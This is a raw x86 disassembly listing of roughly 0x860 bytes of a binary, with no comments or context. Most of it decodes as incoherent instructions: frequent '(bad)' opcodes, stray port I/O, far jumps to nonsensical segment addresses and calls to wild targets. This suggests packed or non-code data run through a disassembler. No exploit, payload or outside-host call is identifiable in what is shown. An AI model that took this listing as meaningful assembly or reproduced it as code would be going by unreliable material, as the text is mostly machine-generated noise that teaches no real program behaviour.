  401fea:	inc    esp
  401feb:	add    edi,DWORD PTR [eax]
  401fed:	jne    0x401fd2
  401fef:	mov    DWORD PTR [eax-0x7449db04],ecx
  401ff5:	cmp    ecx,DWORD PTR [edi]
  401ff7:	sub    BYTE PTR [ebp-0x7e],dl
  401ffa:	sar    ebp,0xb
  401ffd:	jmp    FWORD PTR [edi+0x2400392a]
  402003:	sub    esi,DWORD PTR [ebx-0x73]
  402006:	mov    esp,DWORD PTR [ecx+edi*4]
  402009:	mov    ecx,DWORD PTR [eax]
  40200b:	and    BYTE PTR [eax],al
  40200d:	jne    0x401fd9
  40200f:	sub    ebp,ecx
  402011:	sbb    BYTE PTR [esi+0x32],ah
  402014:	dec    ebp
  402015:	push   ebp
  402016:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40201c:	ret    
  40201d:	mov    edx,ebp
  40201f:	leave  
  402020:	sub    DWORD PTR [esi+0x24],ebx
  402023:	ret    0x2b
  402026:	pop    ax
  402028:	push   ebp
  402029:	rol    BYTE PTR [ebx],0xeb
  40202c:	add    DWORD PTR [ecx+0x6c0001],0x40
  402033:	jb     0x40208a
  402035:	ret    
  402036:	in     al,dx
  402037:	jecxz  0x401fc4
  402039:	push   esi
  40203a:	xchg   esp,eax
  40203b:	jne    0x40203d
  40203d:	cmp    edx,DWORD PTR [esi+0x1c]
  402040:	jne    0x402026
  402042:	mov    eax,DWORD PTR [ebp-0x77]
  402045:	ror    DWORD PTR [ebx+0x899408],0xe0
  40204c:	mov    esi,DWORD PTR [ebp-0x75]
  40204f:	pop    esi
  402050:	nop
  402051:	mov    eax,DWORD PTR [eax]
  402053:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  402059:	add    al,0x0
  40205b:	inc    ebp
  40205c:	mov    eax,DWORD PTR [ebx]
  40205e:	mov    ebp,ebx
  402060:	cmp    al,0xf
  402062:	or     al,al
  402064:	inc    ebp
  402065:	inc    ebp
  402066:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  40206c:	cld    
  40206d:	add    BYTE PTR [edi+0x596c16c0],dh
  402073:	add    BYTE PTR [ecx-0x5],dl
  402076:	add    eax,0x17200
  40207b:	sbb    al,0x85
  40207d:	dec    esp
  40207e:	je     0x4020b8
  402080:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  402084:	add    BYTE PTR [ebx],bh
  402086:	(bad)  
  402087:	and    al,0x3b
  402089:	jae    0x402027
  40208b:	mov    cl,cl
  40208d:	inc    DWORD PTR [esp]
  402090:	push   ebp
  402091:	shr    esp,0x8
  402094:	in     al,dx
  402095:	push   esp
  402096:	and    DWORD PTR [eax],0xffffffdc
  402099:	retf   
  40209a:	(bad)  
  40209b:	mov    bh,0xe4
  40209d:	add    BYTE PTR [ebp+0x450ff8e9],dh
  4020a3:	retf   0x4cf8
  4020a6:	pushf  
  4020a7:	and    bh,al
  4020a9:	pop    ss
  4020aa:	rcr    cl,1
  4020ac:	test   DWORD PTR [eax],eax
  4020ae:	clc    
  4020af:	add    BYTE PTR [ebp+0x2b],al
  4020b2:	cmp    al,cl
  4020b4:	pushf  
  4020b5:	add    eax,0xd001c7
  4020ba:	add    eax,0x456cf8c0
  4020bf:	inc    eax
  4020c0:	push   ebx
  4020c1:	rcr    DWORD PTR [eax+0x4c0105],0x20
  4020c8:	inc    ebp
  4020c9:	fst    DWORD PTR [esi+0x29]
  4020cc:	mov    eax,DWORD PTR [eax]
  4020ce:	nop
  4020cf:	rol    BYTE PTR [eax],0xc0
  4020d2:	mov    ecx,DWORD PTR [ebp-0x3c4fdbe4]
  4020d8:	add    DWORD PTR [ebx-0x75f9af00],ecx
  4020de:	pop    ebp
  4020df:	add    DWORD PTR [ecx+0x758bf800],ecx
  4020e5:	or     BYTE PTR [ebp-0xce8aca],al
  4020eb:	mov    bl,BYTE PTR [eax]
  4020ed:	add    DWORD PTR [ebp+0x0],edx
  4020f0:	call   0xfff31ffe
  4020f5:	add    DWORD PTR [edi],ecx
  4020f7:	add    BYTE PTR [edi],al
  4020f9:	push   cs
  4020fa:	inc    ecx
  4020fb:	or     BYTE PTR [ebx+0x18008901],0x8
  402102:	leave  
  402103:	dec    ecx
  402104:	dec    esi
  402105:	add    esi,DWORD PTR [ebp-0x39]
  402108:	call   0xffe61009
  40210d:	clc    
  40210e:	inc    ebp
  40210f:	inc    ebp
  402110:	mov    ecx,DWORD PTR [edi]
  402112:	enter  0x49,0x35
  402116:	mov    ecx,DWORD PTR [eax]
  402118:	xor    eax,0x79f0807
  40211d:	xor    bl,BYTE PTR [edi-0x743ecda2]
  402123:	or     al,0x1c
  402125:	sbb    BYTE PTR ds:0x8b004d01,0x0
  40212c:	int3   
  40212d:	test   DWORD PTR [eax],eax
  40212f:	clc    
  402130:	inc    edx
  402132:	mov    eax,DWORD PTR [eax]
  402134:	fmul   DWORD PTR [ebx+0x74ff8300]
  40213a:	sub    BYTE PTR [ebp-0x40],ah
  40213d:	add    BYTE PTR [esi+0x45],bl
  402140:	leave  
  402141:	cmp    BYTE PTR [eax],bl
  402143:	pushf  
  402144:	mov    eax,edi
  402146:	jl     0x402128
  402148:	add    BYTE PTR [ebp+0x458df88b],al
  40214e:	add    al,0x3c
  402150:	or     BYTE PTR [eax+ebp*8-0x3617f139],bl
  402157:	test   edx,esp
  402159:	clc    
  40215a:	or     eax,DWORD PTR [ebp+0x40]
  40215d:	cmp    BYTE PTR [ecx+0x458b949f],cl
  402163:	sbb    al,0xbe
  402165:	mov    ecx,DWORD PTR [eax]
  402167:	xchg   esp,eax
  402168:	pop    es
  402169:	add    dh,al
  40216b:	mov    esp,DWORD PTR [ebp+0x1c]
  40216e:	add    BYTE PTR [edi-0x61],dl
  402171:	mov    eax,0x30132
  402176:	mov    DWORD PTR [ebp-0x68],eax
  402179:	mov    eax,DWORD PTR [ebp-0x74]
  40217c:	xor    eax,DWORD PTR [eax]
  40217e:	add    ecx,DWORD PTR [ebx-0xf637677]
  402184:	inc    ebp
  402185:	jge    0x4021d7
  402187:	mov    DWORD PTR [ebp-0xc],eax
  40218a:	xor    eax,eax
  40218c:	add    ecx,DWORD PTR [ebx]
  40218e:	push   eax
  40218f:	jne    0x4021d6
  402191:	mov    eax,DWORD PTR ds:0x3f001c
  402197:	dec    DWORD PTR [ebx-0x7f74e375]
  40219d:	add    eax,DWORD PTR [ecx]
  40219f:	cmp    al,0x0
  4021a1:	push   cs
  4021a2:	inc    ebp
  4021a3:	inc    ebp
  4021a4:	add    al,0x85
  4021a6:	add    BYTE PTR [edi+edi*8-0x1],dh
  4021aa:	mov    ebx,DWORD PTR [esp+ecx*1]
  4021ad:	mov    ebp,0x8bffff4d
  4021b2:	mov    ebx,DWORD PTR [esp+esi*8]
  4021b5:	sbb    al,0x1
  4021b8:	inc    ebp
  4021b9:	add    BYTE PTR [ebx-0x74a67700],cl
  4021bf:	push   ecx
  4021c0:	clc    
  4021c1:	add    eax,0x457218
  4021c6:	mov    eax,DWORD PTR [ebp+0x50]
  4021c9:	jne    0x402210
  4021cb:	mov    ecx,DWORD PTR [ebx-0x39761fe4]
  4021d1:	add    edi,eax
  4021d3:	add    BYTE PTR [ebp+0x31],al
  4021d6:	lea    eax,[eax+0x4501dc]
  4021dc:	lea    edx,[eax-0x74]
  4021df:	xor    ecx,DWORD PTR [ebx-0x39a4f7a1]
  4021e5:	ret    0xc7
  4021e8:	mov    eax,DWORD PTR [eax+0xee011c]
  4021ee:	add    BYTE PTR [eax],cl
  4021f0:	push   eax
  4021f1:	inc    ebp
  4021f2:	inc    ebp
  4021f3:	add    DWORD PTR [ebx+0x8b98eb],ecx
  4021f9:	test   edi,eax
  4021fb:	jne    0x402189
  4021fd:	mov    eax,DWORD PTR [eax]
  4021ff:	mov    eax,DWORD PTR [eax]
  402201:	push   eax
  402202:	pop    ebp
  402203:	inc    ebp
  402204:	dec    DWORD PTR [ebx+0x590ce48b]
  40220a:	rcl    BYTE PTR [ecx-0x40],1
  40220d:	xor    esi,DWORD PTR [eax]
  40220f:	add    DWORD PTR [ebp-0x70],0xffffff83
  402213:	mov    edi,0x8372fc
  402218:	push   eax
  402219:	(bad)  
  40221a:	jbe    0x402261
  40221c:	mov    ecx,DWORD PTR [ebx-0x39341714]
  402222:	ret    
  402223:	(bad)  
  402224:	dec    ebp
  402225:	inc    ebp
  402226:	jmp    0x4021b5
  402228:	mov    ecx,DWORD PTR [esp+eiz*8-0xf7f375]
  40222f:	(bad)  
  402230:	cld    
  402231:	(bad)  
  402232:	push   ebp
  402233:	mov    ecx,DWORD PTR [eax+0x18aa8b1c]
  402239:	add    BYTE PTR [ebx],bh
  40223b:	push   eax
  40223c:	push   eax
  40223d:	inc    ebp
  40223e:	jmp    0x3d86dce
  402243:	add    BYTE PTR [ebx+0x8ca0c7],cl
  402249:	add    BYTE PTR [ebx-0x13cfd500],cl
  40224f:	inc    ebp
  402250:	ret    
  402251:	mov    DWORD PTR [ebp-0x14],edx
  402254:	mov    edx,eax
  402256:	sub    BYTE PTR [ebp-0x2d],cl
  402259:	mov    ecx,DWORD PTR [ebp-0x75]
  40225c:	mov    eax,esi
  40225e:	rol    BYTE PTR [eax],1
  402260:	inc    ebp
  402261:	add    DWORD PTR [eax],eax
  402263:	inc    ebp
  402264:	add    BYTE PTR [ecx+0x18838beb],cl
  40226a:	clc    
  40226b:	inc    eax
  40226c:	jmp    0x8d45:0x74945589
  402273:	xor    ecx,DWORD PTR [eax]
  402275:	add    edx,DWORD PTR [ebp-0x77]
  402278:	mov    ebx,DWORD PTR [eax-0x76aaba18]
  40227e:	mov    ebx,DWORD PTR [eax+edi*8-0x76af48bb]
  402285:	inc    ebp
  402286:	fdiv   DWORD PTR [ebx]
  402288:	loop   0x40228d
  40228a:	(bad)  
  40228c:	add    BYTE PTR [ebp+0x55],al
  40228f:	add    eax,0xd8008b
  402294:	jmp    0xcd80:0x611c818b
  40229b:	add    DWORD PTR [ebx],esi
  40229d:	add    BYTE PTR [ecx-0x63fbc2bb],al
  4022a3:	add    BYTE PTR [ebp-0x77],dh
  4022a6:	mov    edx,DWORD PTR [eax+0x45cb30d4]
  4022ac:	dec    ebp
  4022ad:	inc    DWORD PTR [ebx]
  4022af:	test   DWORD PTR [ebx+0x108b0074],eax
  4022b5:	sbb    BYTE PTR [ebp+0x65],dl
  4022b8:	add    eax,DWORD PTR [eax]
  4022ba:	mov    edi,DWORD PTR [eax-0x75]
  4022bd:	add    ah,dl
  4022bf:	and    edx,DWORD PTR [ecx*2-0x741bd475]
  4022c6:	dec    ebp
  4022c7:	mov    DWORD PTR [ebx-0xfc071c],eax
  4022cd:	dec    ebp
  4022ce:	call   0x5541d05d
  4022d3:	inc    ebp
  4022d4:	add    DWORD PTR [ebx+0x855fcf4],ecx
  4022da:	cmp    ecx,DWORD PTR [ebp-0x5c]
  4022dd:	inc    eax
  4022de:	add    BYTE PTR [ecx+0x73],dl
  4022e1:	jb     0x4022e6
  4022e3:	mov    esi,eax
  4022e5:	cmp    al,0x50
  4022e7:	retf   
  4022e8:	mov    DWORD PTR [ecx+0x4500f0],eax
  4022ee:	test   ebx,edx
  4022f0:	andnps xmm6,XMMWORD PTR [edx+0x3]
  4022f4:	dec    DWORD PTR [ecx+0x51ecfc8b]
  4022fa:	inc    ebp
  4022fb:	add    eax,edi
  4022fd:	mov    DWORD PTR [eax+ebx*1-0x38ffab00],ecx
  402304:	inc    ecx
  402305:	hlt    
  402306:	mov    DWORD PTR [eax],eax
  402308:	xchg   esp,eax
  402309:	add    BYTE PTR [ebp+0x7d],al
  40230c:	xor    eax,edx
  40230e:	add    edx,ecx
  402310:	mov    DWORD PTR [ecx+0x5f45e898],ecx
  402316:	mov    DWORD PTR [eax-0x64],edx
  402319:	mov    DWORD PTR [ebp-0x8],eax
  40231c:	push   eax
  40231d:	push   ebp
  40231e:	inc    ebp
  40231f:	mov    DWORD PTR [ebx],esi
  402321:	call   0xf907829
  402326:	inc    ebp
  402327:	adc    al,BYTE PTR ds:0x810055
  40232d:	dec    DWORD PTR [ebx-0x7f76e400]
  402333:	aam    0x1
  402335:	push   ebp
  402336:	add    cl,al
  402338:	xor    BYTE PTR [eax*2-0x7472003e],cl
  40233f:	call   FWORD PTR [esi+edx*8]
  402342:	cmp    dl,0x1
  402345:	test   DWORD PTR [eax],eax
  402347:	clc    
  402348:	inc    ebp
  402349:	and    cl,BYTE PTR [ebx+0x7503fc4d]
  40234f:	mov    DWORD PTR [ecx+0x1008ffd4],ecx
  402355:	cmp    edi,edi
  402357:	je     0x402329
  402359:	mov    eax,DWORD PTR [ebp-0x4]
  40235c:	add    edx,DWORD PTR [ecx]
  40235e:	sbb    al,0x0
  402360:	dec    ebp
  402361:	dec    ebp
  402362:	mov    DWORD PTR [ecx+0x4545011c],ecx
  402368:	mov    ecx,DWORD PTR [ebx+0x4590181c]
  40236e:	add    DWORD PTR [edx],eax
  402370:	add    BYTE PTR [ebp+0x45],cl
  402373:	jne    0x402300
  402375:	mov    ecx,DWORD PTR [eax+esi*8-0x7474ab00]
  40237c:	cmp    esp,esi
  40237e:	jb     0x402311
  402380:	mov    eax,DWORD PTR [eax]
  402382:	mov    eax,DWORD PTR [eax]
  402384:	mov    edx,DWORD PTR [esp+edi*1]
  402387:	inc    ebp
  402388:	je     0x402315
  40238a:	push   eax
  40238b:	add    al,0x38
  40238d:	push   ebp
  40238e:	mov    DWORD PTR ds:[ecx],edi
  402391:	in     al,0xc
  402393:	shl    BYTE PTR [eax],cl
  402395:	test   DWORD PTR [ecx],eax
  402397:	call   DWORD PTR [edx]
  402399:	inc    esi
  40239b:	inc    ebp
  40239c:	ror    BYTE PTR [ecx+0x45459011],1
  4023a2:	jmp    0xff4120ab
  4023a7:	mov    ecx,DWORD PTR [ebx-0xfba7eb0]
  4023ad:	mov    eax,DWORD PTR [eax]
  4023af:	loopne 0x40233c
  4023b1:	(bad)  
  4023b2:	sbb    al,0xc7
  4023b4:	inc    ebp
  4023b5:	inc    ebp
  4023b6:	push   ebx
  4023b7:	lea    edi,[eax+0x454fdc]
  4023bd:	lea    ecx,[ecx-0x74a774]
  4023c3:	or     BYTE PTR [edi-0x3a],dl
  4023c6:	js     0x40238f
  4023c8:	mov    ecx,DWORD PTR [ebx-0x117ae39a]
  4023ce:	inc    DWORD PTR [eax]
  4023d0:	call   DWORD PTR [eax+0x7a]
  4023d3:	inc    ebp
  4023d4:	add    BYTE PTR [ebx+0x859866],cl
  4023da:	(bad)  
  4023db:	(bad)  
  4023dc:	dec    DWORD PTR [ebx-0x2f99f3b9]
  4023e2:	test   DWORD PTR [ebp-0x1],eax
  4023e5:	mov    edi,edi
  4023e7:	add    al,0x0
  4023ea:	add    ax,WORD PTR [ebp-0xb20004]
  4023f1:	inc    DWORD PTR [edi+0x14]
  4023f4:	data16 or BYTE PTR [ebp-0xac008b],al
  4023fb:	push   ebp
  4023fc:	ror    BYTE PTR [ebx+0x4585fc66],0xff
  402403:	(bad)  
  402404:	inc    DWORD PTR [ebx+eax*2]
  402407:	inc    ebp
  402408:	add    BYTE PTR [ebx+0x45851c66],cl
  40240e:	dec    DWORD PTR [ebx+0xc090ff]
  402414:	mov    ax,WORD PTR [ebp-0x7f00e4]
  40241b:	add    DWORD PTR [esi+0x0],eax
  40241e:	add    BYTE PTR [eax],dh
  402420:	xor    WORD PTR [ebp-0xcd00e1],ax
  402427:	cmp    al,bh
  402429:	jbe    0x4023b4
  40242b:	lea    ebp,[edi+esi*1-0x1]
  40242f:	mov    edi,DWORD PTR [eax+0x394f03]
  402435:	jae    0x4023c0
  402437:	mov    ebp,DWORD PTR [esi-0x75]
  40243a:	dec    DWORD PTR [ebx+0x3d02bb8]
  402440:	add    BYTE PTR [ecx-0x38f7477],cl
  402446:	call   DWORD PTR [esi+0x55d7ffb8]
  40244c:	add    ah,ch
  40244e:	mov    esp,ebp
  402450:	jb     0x402452
  402452:	inc    DWORD PTR [eax]
  402454:	mov    eax,0x89e145
  402459:	sbb    al,0x89
  40245b:	push   esi
  40245c:	je     0x40246c
  40245e:	inc    DWORD PTR [eax]
  402460:	(bad)  
  402461:	data16 in al,dx
  402463:	test   DWORD PTR [ebp+0x7efff8ff],eax
  402469:	lea    eax,[eax]
  40246b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40246c:	mov    WORD PTR [ebp-0xa50077],0x45ff
  402475:	mov    eax,0x9c4f38
  40247a:	lea    ecx,[ecx-0x76a3f6]
  402480:	js     0x40240f
  402482:	inc    DWORD PTR [esi+eax*8]
  402485:	mov    esp,esp
  402487:	pop    esi
  402488:	(bad)  
  402489:	jmp    ebp
  40248b:	add    esi,0x50
  40248e:	out    0x89,al
  402490:	(bad)  
  402491:	pusha  
  402492:	out    0xff,eax
  402494:	(bad)  
  402495:	(bad)  
  402496:	call   0xc6c957a3
  40249b:	(bad)  
  40249c:	jmp    0xbec358a0
  4024a1:	inc    ebx
  4024a2:	add    BYTE PTR [ecx-0xbb9c00],cl
  4024a8:	in     al,0xb8
  4024aa:	mov    dh,0x4f
  4024ac:	add    DWORD PTR [eax],0x4a
  4024af:	mov    esi,ebx
  4024b1:	data16 mov bh,bh
  4024b4:	add    DWORD PTR [ebx-0x7613c7fa],0x45
  4024bb:	push   0xb845ffe3
  4024c0:	in     eax,dx
  4024c1:	dec    edi
  4024c2:	inc    ebp
  4024c3:	add    bl,dl
  4024c5:	mov    DWORD PTR [ebp+0x6a],eax
  4024c8:	in     al,dx
  4024c9:	inc    DWORD PTR [ebp-0x75]
  4024cc:	sub    eax,0x2c854566
  4024d1:	inc    DWORD PTR [ebp-0x1]
  4024d4:	jle    0x402520
  4024d6:	leave  
  4024d7:	add    BYTE PTR [esi+eiz*2-0x24],al
  4024db:	test   DWORD PTR [esi+0x4aff83ff],esi
  4024e1:	push   0x668800de
  4024e6:	add    DWORD PTR [ebp-0x1300f9],0x45
  4024ed:	outs   dx,DWORD PTR ds:[esi]
  4024ee:	in     eax,dx
  4024ef:	add    BYTE PTR [ebp+0x66],al
  4024f2:	(bad)  
  4024f3:	test   DWORD PTR [ebp-0x1],eax
  4024f6:	jmp    0x4500:0xe17f45ff
  4024fd:	data16 fild WORD PTR [ebp-0x1100bb]
  402504:	inc    ebp
  402505:	inc    ebp
  402506:	xlat   BYTE PTR ds:[ebx]
  402507:	cmp    eax,DWORD PTR [ebp-0x64]
  40250a:	jle    0x4024c4
  40250c:	leave  
  40250d:	icebp  
  40250e:	inc    esp
  40250f:	add    ah,dl
  402511:	mov    DWORD PTR [esi+0x4aff8376],esi
  402517:	(bad)  
  402518:	fdivrp st(0),st
  40251a:	mov    BYTE PTR [ebp+0x4708f883],al
  402520:	in     al,dx
  402521:	test   WORD PTR [ebp-0x1],ax
  402528:	inc    ebp
  402529:	inc    ebp
  40252a:	mov    edx,ecx
  40252c:	cld    
  40252d:	inc    ebp
  40252e:	out    dx,al
  40252f:	rcl    BYTE PTR [ebx],cl
  402531:	inc    ebp
  402532:	mov    edi,edx
  402534:	mov    eax,DWORD PTR [ebp+0x54]
  402537:	sub    eax,0x2c3b45ff
  40253c:	jne    0x402510
  40253e:	mov    DWORD PTR [ebp-0x44],0xf8c9857e
  402545:	int3   
  402546:	inc    ebp
  402547:	add    ch,ch
  402549:	lea    ebx,[ebp+ecx*1+0x181c0f8b]
  402550:	xor    bl,0x1
  402553:	add    eax,DWORD PTR [eax]
  402555:	inc    ecx
  402556:	adc    BYTE PTR [eax],bl
  402558:	test   ecx,edi
  40255a:	add    dh,BYTE PTR [edx+0x0]
  40255d:	mov    BYTE PTR [ebp-0x24],0x8b
  402561:	(bad)  
  402562:	jl     0x402541
  402564:	add    dh,al
  402566:	mov    esi,ebx
  402568:	mov    eax,esi
  40256a:	sbb    al,0xdf
  40256c:	add    dh,0x1
  40256f:	loopne 0x402571
  402571:	(bad)  
  402572:	adc    cl,ah
  402574:	or     dh,al
  402576:	inc    ebp
  402577:	loop   0x402566
  402579:	xor    ebp,edx
  40257b:	(bad)  
  40257c:	(bad)  
  40257d:	or     eax,0x18ee0ff8
  402582:	jle    0x402577
  402584:	inc    ebp
  402585:	add    ebx,DWORD PTR [ecx+0x41]
  402588:	adc    BYTE PTR [eax],bl
  40258a:	repnz stc 
  40258c:	xor    BYTE PTR [edx+0x34],0xc6
  402590:	adc    ah,dl
  402592:	dec    ecx
  402593:	(bad)  
  402594:	repnz aad 0x45
  402597:	(bad)  
  402598:	mov    esi,edx
  40259a:	adc    al,0xc6
  40259c:	call   edi
  40259e:	(bad)  
  40259f:	(bad)  
  4025a0:	adc    al,bl
  4025a2:	inc    esi
  4025a4:	push   eax
  4025a5:	fld    DWORD PTR [ebp-0x3a]
  4025a8:	mov    esi,0x7c608da
  4025ad:	fcmovnb st,st(6)
  4025af:	xor    ebx,DWORD PTR [edi+0x30d328d]
  4025b5:	(bad)  
  4025b7:	sbb    BYTE PTR [ebp-0xd],al
  4025ba:	add    DWORD PTR [ebx],0x66
  4025bd:	inc    ecx
  4025be:	mov    ebx,DWORD PTR [eax]
  4025c0:	sbb    al,0xf9
  4025c2:	xor    BYTE PTR [edx+0x1],0x8d
  4025c6:	add    BYTE PTR [ebp+eax*4-0x1],dl
  4025ca:	dec    DWORD PTR [ecx+0x4d00fcff]
  4025d0:	add    BYTE PTR [eax+0x7145fc30],bh
  4025d6:	inc    DWORD PTR [ecx]
  4025d8:	mov    ecx,DWORD PTR [ebp-0x310010]
  4025de:	retf   
  4025df:	enter  0xe45,0x3b
  4025e3:	inc    ebp
  4025e4:	jne    0x40261e
  4025e6:	mov    eax,ds:0x33c70b9c
  4025eb:	mov    esp,0xf81585ee
  4025f0:	mov    ds:0x338b0b45,eax
  4025f5:	mov    WORD PTR [esi-0x5cc68e00],cs
  4025fb:	ud2    
  4025fd:	xchg   ebp,eax
  4025fe:	xor    eax,DWORD PTR [eax]
  402600:	dec    edx
  402601:	mov    eax,DWORD PTR [eax]
  402603:	sbb    al,0x83
  402605:	cmp    ah,0x1
  402608:	push   0x0
  40260a:	pop    eax
  40260b:	adc    BYTE PTR [ecx-0x7483bb],cl
  402611:	and    BYTE PTR [esi+0x0],0x85
  402615:	mov    edi,edi
  402617:	push   0xffffffff
  402619:	(bad)  
  40261a:	mov    esp,esi
  40261c:	adc    dh,0x75
  40261f:	loope  0x402687
  402621:	inc    ebp
  402622:	inc    ebp
  402623:	fild   QWORD PTR [edx-0x29]
  402626:	mov    ecx,DWORD PTR [ebp-0x75990be4]
  40262c:	inc    ebp
  40262d:	sub    BYTE PTR [edx+0x4a],0x58
  402631:	jmp    0x752c:0x40868889
  402638:	lea    ax,[ebp-0xc]
  40263c:	xor    eax,DWORD PTR [ebp-0x5f0078]
  402642:	mov    DWORD PTR [ebp-0x820076],eax
  402648:	stos   DWORD PTR es:[edi],eax
  402649:	mov    ebp,DWORD PTR [ebx-0x43a67414]
  40264f:	push   ecx
  402650:	test   DWORD PTR [ebx],esi
  402652:	(bad)  
  402653:	mov    ebx,0xc072ff
  402658:	push   ebp
  402659:	ret    
  40265a:	(bad)  
  40265b:	mov    eax,eax
  40265d:	sbb    al,0xdf
  40265f:	rcl    dh,0x50
  402662:	inc    ebp
  402663:	inc    ebp
  402664:	int3   
  402665:	mov    ebp,ebx
  402667:	cwde   
  402668:	mov    DWORD PTR [eax],0x10d3c7c8
  40266e:	jmp    0xd500:0xdf0145ff
  402675:	jmp    DWORD PTR [esi-0x75]
  402678:	inc    ebp
  402679:	or     BYTE PTR [edi],bh
  40267b:	rol    bh,1
  40267d:	dec    ebp
  40267e:	adc    BYTE PTR [ebx],dh
  402680:	inc    DWORD PTR [ebx]
  402682:	add    cl,BYTE PTR [ecx-0x3e174400]
  402688:	push   ss
  402689:	push   ds
  40268a:	add    cl,ah
  40268c:	test   DWORD PTR [ebx-0x1],esi
  40268f:	or     eax,0x22850bff
  402694:	jmp    ecx
  402696:	push   DWORD PTR [ebx-0x75]
  402699:	add    eax,0x3359e9ec
  40269e:	push   ecx
  40269f:	loope  0x4026d4
  4026a1:	jae    0x4026a6
  4026a3:	jmp    0x8527f8
  4026a8:	and    DWORD PTR [ebp+0x44],0x0
  4026ac:	mov    esp,DWORD PTR [eax]
  4026ae:	sbb    al,0x66
  4026b0:	add    BYTE PTR [ebp-0xff00ff],0x30
  4026b7:	mov    DWORD PTR [ebp+0x7e],eax
  4026ba:	(bad)  
  4026bb:	inc    DWORD PTR [ebx-0xbadf9a]
  4026c1:	push   0xffffffff
  4026c3:	pop    eax
  4026c4:	clc    
  4026c5:	mov    DWORD PTR [eax],ecx
  4026c7:	or     BYTE PTR [ecx-0x8aef8d],0x58
  4026ce:	mov    DWORD PTR [ecx+0x76ff8428],ecx
  4026d4:	lea    esp,[esi+0x10]
  4026d7:	inc    ebp
  4026d8:	jmp    FWORD PTR [edx+0x50]
  4026db:	pop    eax
  4026dc:	inc    ebp
  4026dd:	mov    DWORD PTR [ebx],esi
  4026df:	mov    BYTE PTR [ebx],al
  4026e1:	rcl    BYTE PTR [eax+0x45],0x85
  4026e5:	inc    WORD PTR [ebp-0x1]
  4026e9:	lea    ecx,[ebx-0x7f99e35f]
  4026ef:	stos   BYTE PTR es:[edi],al
  4026f0:	add    DWORD PTR [ebp+0x0],eax
  4026f3:	mov    ecx,ecx
  4026f5:	adc    al,0x95
  4026f7:	(bad)  
  4026f8:	push   DWORD PTR [ebx]
  4026fa:	dec    DWORD PTR [ebp+0x45ffc095]
  402700:	dec    esi
  402702:	push   ebp
  402703:	loop   0x40268e
  402705:	(bad)  
  402706:	adc    al,0xc4
  402708:	call   ebx
  40270a:	mov    ecx,ebp
  40270c:	sbb    BYTE PTR [ebp-0x1],al
  40270f:	loopne 0x40269a
  402711:	cmp    al,0x24
  402713:	(bad)  
  402714:	dec    esp
  402716:	mov    eax,ebp
  402718:	sub    al,0xed
  40271a:	inc    edi
  40271c:	mov    eax,edx
  40271e:	xor    BYTE PTR [esi-0x1],bh
  402721:	test   edi,edi
  402723:	dec    DWORD PTR [ebx-0x2ffff701]
  402729:	add    BYTE PTR [ebp+0x2c],al
  40272c:	push   eax
  40272d:	add    bh,dl
  40272f:	mov    DWORD PTR [ebp+0x18],edi
  402732:	jbe    0x402733
  402734:	test   DWORD PTR [ebp-0xffefff],ecx
  40273a:	inc    ebp
  40273b:	push   eax
  40273c:	add    DWORD PTR [ebp-0x4],0x801be
  402743:	pop    es
  402744:	add    dh,0xfe
  402747:	ret    
  402748:	dec    DWORD PTR [ebx-0x3fffe34b]
  40274e:	mov    ecx,0x454f50
  402753:	mov    eax,ecx
  402755:	cwde   
  402756:	mov    DWORD PTR [eax],eax
  402758:	test   al,0xff
  40275a:	ror    BYTE PTR [ebx-0x2f99f775],0x55
  402761:	lea    ecx,[ebp-0x7600f401]
  402767:	mov    ebp,DWORD PTR [edx+ebp*2-0x7a99a73e]
  40276e:	push   ebp
  40276f:	dec    DWORD PTR [ebp-0x767ae601]
  402775:	push   DWORD PTR [eax+0x6685c2ff]
  40277b:	call   DWORD PTR [ebp-0x1]
  40277e:	lea    ecx,[ebx-0x397613e1]
  402784:	mov    ah,0xc3
  402786:	mov    DWORD PTR [ebp-0x30a74a],ecx
  40278c:	mov    DWORD PTR [eax-0x48],edx
  40278f:	inc    ebp
  402790:	dec    edx
  402791:	mov    ecx,DWORD PTR [ebx+0x55006698]
  402797:	xor    ecx,DWORD PTR [ebx+0x557c668d]
  40279d:	dec    DWORD PTR [ebp-0x76e3b477]
  4027a3:	call   DWORD PTR [eax-0x6d5f7673]
  4027a9:	lea    eax,[ecx-0x1]
  4027ac:	inc    WORD PTR [ebp-0x73]
  4027b0:	cmp    edi,0x5
  4027b3:	dec    DWORD PTR [ecx+0x41ff9695]
  4027b9:	jmp    DWORD PTR [esi-0x73]
  4027bc:	inc    ebp
  4027bd:	jmp    DWORD PTR [esi-0x1]
  4027c0:	dec    ebp
  4027c1:	lea    esp,[esi-0x1]
  4027c4:	jge    0x4027c5
  4027c6:	mov    esi,DWORD PTR [eax]
  4027c8:	lock inc ebp
  4027ca:	mov    bh,0xff
  4027cc:	mov    WORD PTR [ebp-0x3c5f3a],cs
  4027d2:	rol    DWORD PTR [eax+0xf8ca289],0x45
  4027d9:	push   cs
  4027da:	str    WORD PTR [ebp-0x1]
  4027de:	xor    edi,esp
  4027e0:	add    edi,DWORD PTR [ebp+0x33]
  4027e3:	add    BYTE PTR [esi+0x0],ah
  4027e6:	inc    ebp
  4027e7:	rdpmc  
  4027e9:	mov    edi,0xbf45ff66
  4027ee:	dec    si
  4027f0:	inc    ebp
  4027f1:	add    BYTE PTR [ebx+0x45000c0d],cl
  4027f7:	mov    edi,edi
  4027f9:	data16 sbb al,0x45
  4027fc:	jne    0x402781
  4027fe:	push   ebx
  402800:	adc    al,0xd0
  402802:	jne    0x40278d
  402804:	jmp    FWORD PTR [edx+0x66755108]
  40280a:	call   0xffc42064
  40280f:	or     BYTE PTR [ebp-0x77],al
  402812:	mov    ebp,DWORD PTR [esi+0x6645511c]
  402818:	mov    edx,DWORD PTR [ebp-0x70]
  40281b:	add    DWORD PTR [eax],0x5
  40281e:	mov    ecx,DWORD PTR [ecx+0x5180b21c]
  402824:	add    DWORD PTR [esi+0x0],esp
  402827:	push   ebp
  402828:	xor    BYTE PTR [esi+0x4d],ah
  40282b:	dec    ebp
  40282c:	mov    ecx,DWORD PTR [ebx+0x4d72663b]
  402832:	mov    ecx,DWORD PTR [ebp-0x2ec3fe75]
  402838:	jl     0x4027c3
  40283a:	push   eax
  40283b:	mov    esi,?
  40283d:	rcl    bh,1
  40283f:	mov    DWORD PTR [esi],eax
  402841:	mov    es,esi
  402843:	push   ecx
  402844:	ret    0x166
  402847:	push   ebp
